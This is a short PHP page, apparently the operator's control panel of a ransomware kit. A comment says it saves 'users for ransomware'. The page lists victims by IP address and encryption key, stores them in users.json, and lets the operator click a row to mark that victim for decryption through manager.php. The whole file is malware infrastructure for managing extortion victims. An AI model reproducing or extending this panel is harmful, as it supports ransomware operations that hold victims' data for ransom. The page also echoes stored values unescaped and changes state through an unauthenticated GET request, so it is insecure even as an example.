<?php

/** VARIABLES **/
$users = array(); // Array for storing users
/** VARIABLES **/

/** FUNCTIONS **/
/* Saves users for ransomware */
function saveUsers() {
	global $users;
	
	file_put_contents("users.json",json_encode($users));
}

/* Updates users from file */
function refreshUsers() {
	global $users;

	$users = json_decode(file_get_contents('users.json'), true);
}
/** FUNCTIONS **/

refreshUsers();
if (count($_GET) > 0 && isset($_GET["decryptRow"])) {
	$row = (int)$_GET["decryptRow"];
	print_r($users);
	$users[$row][1] = 1;
	print_r($users);
	saveUsers();
}

echo "<h3>Click any table row to decrypt!</h3>\n\n";
echo "<table>\n<tr>\n<th>IP Address</th>\n<th>Key</th>\n<th>Decrypt</th>\n</tr>\n";

foreach($users as $user) {
	echo "<tr onclick=\"decrypt(this)\">\n<td>".$user[0]."</td>\n<td>".$user[2]."</td>\n<td>".$user[1]."</td>\n</tr>";
}

echo "\n</table>";
?>

<style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.js"></script>
<script>
function decrypt(x) {
	var rowIndex = x.rowIndex-1;
	$.get('manager.php', ('decryptRow=' + rowIndex), function(data) {});
	location.reload();
}
</script>